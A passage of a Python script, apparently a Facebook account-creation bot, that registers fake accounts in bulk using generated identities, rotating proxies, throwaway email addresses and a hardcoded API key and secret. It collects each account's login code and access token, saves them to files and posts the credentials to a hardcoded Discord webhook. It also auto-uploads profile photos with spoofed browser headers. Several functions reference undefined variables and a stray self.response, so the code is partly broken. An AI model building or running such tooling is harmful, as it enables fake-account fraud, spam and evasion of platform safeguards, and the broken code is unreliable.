		for sleep in range(int(num_accounts), 0, -1):
			print(f'[Edji]-[{current}|{num_accounts}]-[SUCCESS:-{len(oks)}|BAD:-{len(cps)}]',end='\r')
			time.sleep(1)
			if current == num_accounts:
				break
#──────────────{ AUTO CREATE METHOD 1 }──────────────#

def menu():
    fake = Faker()
    banner()
    num_accounts = int(input("ENTER HOW MANY ACC YOU WANT: "))
    delay = int(input("ENTER DELAY TIME BETWEEN REQUESTS  : "))
    banner()
    a=(Panel("""    [green_yellow][[bold cyan1]1/A[green_yellow]][bold green] DEFAULT PASSWORD\n    [green_yellow][[bold cyan1]2/B[green_yellow]][bold green] CUSTOM PASSWORD    """,title="[reverse violet] PASSWORD ",style="bold cyan1"))
    print(Panel(a,subtitle="[bold violet]┌─",subtitle_align='left',style="bold violet"))
    bryxpassword = Console().input("   [bold violet]└──> ")
    if bryxpassword in ["a","A","1","01"]:
        password=fake_password()
    elif bryxpassword in ["b","B","2","02"]:
        password=input('\033[1;37mENTER CUSTOM PASSWORD : ')
    banner()
    a=(Panel("""    [green_yellow][[bold cyan1]1/A[green_yellow]][bold green] DEFAULT NAMES\n    [green_yellow][[bold cyan1]2/B[green_yellow]][bold green] MANUAL NAMES    """,title="[reverse violet] NAME ",style="bold cyan1"))
    print(Panel(a,subtitle="[bold violet]┌─",subtitle_align='left',style="bold violet"))
    name_mode = Console().input("   [bold green]└──> ")
    manual_first, manual_last = "", ""
    use_random_each = True

    if name_mode in ["b","B","2","02"]:
        manual_first = input('\033[1;37mFIRST NAME : ')
        manual_last = input('\033[1;37mLAST NAME  : ')
        use_random_each = False

    banner()
    print(Panel(f" [bold green] IF NO RESULT ON/OFF AIRPLANE MODE OR VPN 1.1.1.1",style="bold violet"))
    for _ in range(num_accounts):
        progres(_+1, num_accounts, delay)
        print()
        birthday = fake.date_of_birth(minimum_age=18, maximum_age=90)
        if use_random_each:
            first_name = fake.first_name()
            last_name = fake.last_name()
        else:
            first_name = manual_first
            last_name = manual_last
        register_facebook_account(password, first_name, last_name, birthday)

account_count = 0

def send_to_discord(webhook_url, uid, password, otp, account_counter):
    import requests
    data = {
        "content": f"{uid}:{password} - {otp} - {account_counter}"
    }
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 204:
            print("[✔] Sent to Discord!")
        else:
            print(f"[✖] Failed to send to Discord ({response.status_code})")
    except Exception as e:
        print(f"[!] Discord Error: {e}")

def register_facebook_account(password, first_name, last_name, birthday):
    global account_count
    session = requests.Session()
    proxy = get_random_proxy(proxies)
    session.proxies.update(proxy)
    api_key = '882a8490361da98702bf97a021ddc14d'
    secret = '62f8ce9f74b12f84c123cc23437a4a32'
    gender = random.choice(['M', 'F'])
    em = Email().Mail()
    email = em['mail']
    number = get_nope()
    req = {
        'api_key': api_key,
        'attempt_login': True,
        'birthday': birthday.strftime('%Y-%m-%d'),
        'client_country_code': 'US',
        'fb_api_caller_class': 'com.facebook.registration.protocol.RegisterAccountMethod',
        'fb_api_req_friendly_name': 'registerAccount',
        'firstname': first_name,
        'format': 'json',
        'gender': gender,
        'lastname': last_name,
        'email': email,
        'number': number,
        'locale': 'en_US',
        'method': 'user.register',
        'password': password,
        'reg_instance': generate_random_string(32),
        'return_multiple_errors': True
    }
    sorted_req = sorted(req.items(), key=lambda x: x[0])
    sig = ''.join(f'{k}={v}' for k, v in sorted_req)
    ensig = hashlib.md5((sig + secret).encode()).hexdigest()
    req['sig'] = ensig
    api_url = 'https://b-api.facebook.com/method/user.register'
    headers = {'User-Agent': ua6()}
    proxy = get_random_proxy(proxies)
    response = requests.post(api_url, data=req, headers=headers, proxies=proxy)
    reg = response.json()
    id = reg.get('new_user_id')
    token = reg.get('session_info', {}).get('access_token')
    if id:
        check = lock_checker(id)
        if 'Locked' in check:
            cps.append(id)
        else:
            print(Panel(' [bold green]ACCOUNT ACCESSABLE', style="bold violet"))
            time.sleep(30)
            try:
                cod = Email(em["session"]).inbox()
                code = re.search(r'(\d+)', str(cod['topic'])).group(1)
            except:
                cod = Email(em["session"]).inbox()
                code = re.search(r'(\d+)', str(cod['topic'])).group(1)
            if code:
                a = Tree(":file_folder:", guide_style="bold green_yellow")
                a.add(f"[violet][[yellow2]●[violet]] [bold green]NAME     [cyan2] ⟩ [bold green]{first_name} {last_name}")
                a.add("[violet][[yellow2]●[violet]] [bold green]EMAIL    [cyan2] ⟩ [bold green]"+email)
                a.add("[violet][[yellow2]●[violet]] [bold green]NUMBER   [cyan2] ⟩ [bold green]"+number)
                a.add("[violet][[yellow2]●[violet]] [bold green]LOGIN OTP[cyan2] ⟩ [bold green]"+code)
                print(a)
                hx = ("[bold green]"+token)
                Bryxa = Panel.fit("[green] LOGIN SUCCESS", style="bold violet")
                Bryxb = Panel("[green] "+id, title="[bold green]UID", width=30, padding=0, style="bold violet")
                Bryxc = Panel(f"[bold green] {password}", title="[bold green]PASS", width=30, padding=0, style="bold violet")
                Bryxe = Columns([Bryxa])
                Bryxf = Columns([Bryxb, Bryxc])
                c = Tree(":file_folder:", guide_style="bold green_yellow")
                c.add(Bryxe)
                c.add(Bryxf)
                c.add(Panel(hx, style="bold violet"))
                print(c)
                account_count += 1
                oks.append(id)
                open("/sdcard/AUTO-CREATE-BRYX/create/auto-create-alive.txt", "a").write(id+"|"+code+f"|{password}|"+email+"|"+token+"\n")
                send_to_discord(
                    "https://discord.com/api/webhooks/1362730444914819342/GJQ_9di8cIhEVVy61RBbhEkdFwvRPfzLRPJTWZ4e_kCzb7L7N3NZkWxE-XPiRYlOewtD",
                    id,
                    password,
                    code,
                    account_count
                )
            else:
                print()
    else:
        open("/sdcard/AUTO-CREATE-BRYX/create/auto-create-disabled-cp.txt", "a").write(f"{email}|{id}|BRYXPOGIJOKER123\n")
        cps.append(id)
#──────────────{ AUTO PHOTO }──────────────#
r = requests.Session()
def data_foto(id, fbid):
  return {"input":{"attribution_id_v2":"ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,unexpected,1728770519626,117672,190055527696468,,;WelcomeDashboardCometRoot.react,comet.welcome,via_cold_start,1728770450553,699933,156203961126022,,","caption":"","existing_photo_id":"{}".format(fbid),"expiration_time":None,"profile_id":"{}".format(uid),"profile_pic_method":"EXISTING","profile_pic_source":"TIMELINE","scaled_crop_rect":{"height":0.8079,"width":1,"x":0,"y":0.09605},"skip_cropping":True,"actor_id":"{}".format(uid),"client_mutation_id":"3"},"isPage":False,"isProfile":True,"sectionToken":"UNKNOWN","collectionToken":"UNKNOWN","scale":3,"__relay_internal__pv__ProfileGeminiIsCoinFlipEnabledrelayprovider":False}

def headers_foto():
  return {
      'authority': 'www.facebook.com',
      'accept': '*/*',
      'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
      'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
      'content-type': 'application/x-www-form-urlencoded',
      'origin': 'https://www.facebook.com',
      'referer': 'https://www.facebook.com/profile.php?',
      'sec-ch-prefers-color-scheme': 'light',
      'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="127", "Google Chrome";v="127"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Linux"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
      'x-asbd-id': '129477',
      'x-fb-friendly-name': 'ProfileCometProfilePictureSetMutation',
      'x-fb-lsd': '4kxxjo8hSqAFfrnnfAkqQT',
     }
headerss = {
    "host": "accountscenter.facebook.com",
    "cache-control": "max-age=0",
    "dpr": "2",
    "viewport-width": "980",
    "sec-ch-ua": '"Chromium";v="130", "Android WebView";v="130", "Not?A_Brand";v="99"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
    "sec-ch-ua-platform-version": "",
    "sec-ch-ua-model": "",
    "sec-ch-ua-full-version-list": "",
    "sec-ch-prefers-color-scheme": "light",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Linux; Android 12; CPH2477 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.86 Mobile Safari/537.36",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": "https://m.facebook.com/",
    "accept-encoding": "gzip, deflate,",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}
headd =  {
    "host": "accountscenter.facebook.com",
    "content-length": "1342",
    "sec-ch-ua-full-version-list": "",
    "sec-ch-ua-platform": "Android",
    "sec-ch-ua": "Chromium;v=130, Android WebView;v=130, Not?A_Brand;v=99",
    "x-fb-friendly-name": "",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-model": "",
    "x-asbd-id": "129477",
    "x-fb-lsd": "uIQdVFT1jLfrfOUf9ftVwb",
    "sec-ch-prefers-color-scheme": "light",
    "user-agent": "Mozilla/5.0 (Linux; Android 12; CPH2477 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.86 Mobile Safari/537.36",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua-platform-version": "",
    "accept": "*/*",
    "origin": "https://accountscenter.facebook.com",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://accountscenter.facebook.com/password_and_security/two_factor",
    "accept-encoding": "gzip, deflate,",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}

def photo_profile():
    try:
      head_fot = {
        "host": "web.facebook.com",
        "cache-control": "max-age=0",
        "dpr": "2",
        "viewport-width": "980",
        "sec-ch-ua": '"Chromium";v="130", "Android WebView";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "Android",
        "sec-ch-ua-platform-version": "",
        "sec-ch-ua-model": "",
        "sec-ch-ua-full-version-list": "",
        "sec-ch-prefers-color-scheme": "light",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "x-requested-with": "mark.via.gp",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "referer": "https://m.facebook.com/",
        "accept-encoding": "gzip, deflate,",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
      }
      response = r.get(f'https://web.facebook.com/profile.php?id={id}', cookies={'cookie':cok}, headers=head_fot).text
      headers_fot = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'X-FB-LSD': 'gvCWfnZU1TQ4mWP_cLav_j',
        'X-ASBD-ID': '129477',
        'Origin': 'https://www.facebook.com',
        'Alt-Used': 'www.facebook.com',
        'Connection': 'keep-alive',
        'Referer': f'https://www.facebook.com/{uid}/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
      }
      params = {
        'profile_id': f'{uid}',
        'photo_source': '57',
        'av': f'{uid}',
        '__aaid': '0',
        '__user': f'{uid}',
        '__a': '1',
        '__req': 'z',
        '__hs': '20009.HYP:comet_pkg.2.1..2.1',
        'dpr': '1',
        '__ccg': 'GOOD',
        '__rev': re.search(r'"__spin_r":(\d+)',self.response).group(1),
        '__s': '',
        '__hsi': re.search(r'"hsi":"(\d+)"',self.response).group(1),
        '__dyn': '',
        '__comet_req': re.search(r'__comet_req=(\d+)',self.response).group(1),
        'fb_dtsg': re.search(r'"DTSGInitData",\[\],{"token":"(.*?)",',self.response).group(1),
        'jazoest': re.search(r'jazoest=(\d+)',self.response).group(1),
        'lsd': re.search(r'"LSD",\[\],{"token":"(.*?)"',self.response).group(1), 
        '__spin_r': re.search(r'"__spin_r":(\d+)',self.response).group(1), 
        '__spin_b': re.search(r'"__spin_b":"(.*?)"',self.response).group(1),
        '__spin_t': re.search(r'"__spin_t":(\d+)',self.response).group(1), 
      }
      folder_path = "foto2"
      photo_list = [f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
      if not photo_list:
        raise ValueError("No photos found in the specified folder.")
      p_pic_s = os.path.join(folder_path, random.choice(photo_list))
      p_pic = os.path.getsize(p_pic_s)
      files = {
        'file': open(p_pic_s,'rb').read(),
      }
      response = requests.post('https://www.facebook.com/profile/picture/upload/',params=params,cookies={'cookie': cok},headers=headers_fot,files=files).text
      if "Unable to Read File" in str(response):
        pass
      else:
        fbid = re.search(r'"fbid":"(\d+)"',str(response)).group(1)
        result = Upload_Photo(p_pic_s)
        return result
    except AttributeError: pass
    except requests.exceptions.ConnectionError:
      time.sleep(30)
  
def Upload_Photo(p_pic_s):
    try:
      var = data_foto(uid, fbid)
      data = { 
        'av': '{}'.format(uid), 
        '__aaid': '0', 
        '__user': '{}'.format(uid), 
        '__a': '1', 
        '__req': '1d', 
        '__hs': re.search(r'"haste_session":"(.*?)"',str(self.response)).group(1), 
        'dpr': '3', 
        '__ccg': 'GOOD',
        '__rev': re.search(r'"__spin_r":(\d+)',str(self.response)).group(1), 
        '__s': '', 
        '__hsi': re.search(r'"hsi":"(\d+)"',str(self.response)).group(1),
        '__dyn': '', 
        '__csr': '',
        '__comet_req': re.search(r'__comet_req=(\d+)',str(self.response)).group(1), 
        'fb_dtsg': re.search(r'"DTSGInitData",\[\],{"token":"(.*?)",',str(self.response)).group(1), 
        'jazoest': re.search(r'jazoest=(\d+)',str(self.response)).group(1),
        'lsd': re.search(r'"LSD",\[\],{"token":"(.*?)"',str(self.response)).group(1), 
        '__spin_r': re.search(r'"__spin_r":(\d+)',str(self.response)).group(1), 
        '__spin_b': re.search(r'"__spin_b":"(.*?)"',str(self.response)).group(1),
        '__spin_t': re.search(r'"__spin_t":(\d+)',str(self.response)).group(1), 
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'ProfileCometProfilePictureSetMutation',
        'variables': json.dumps(var),
        'server_timestamps': 'true',
        'doc_id': '8707340955997640',
      }
      header = headers_foto()
      respon = r.post('https://www.facebook.com/api/graphql/', cookies={"cookie":cok}, headers=header, data=data).text
      if "url" in str(respon):
        uri = re.search('"url":"(.*?)"',str(respon)).group(1)
        post = f"{h}Success Post Photo{p}"
        return post
        os.remove(p_pic_s)
      else:
        fail = f"{m}Checkpoint Account{p}"
    except Exception as e: print(e)
    except requests.exceptions.ConnectionError:
      time.sleep(31)
#──────────────{ END }──────────────#
if __name__ == "__main__":
    AUTO_BRYX()
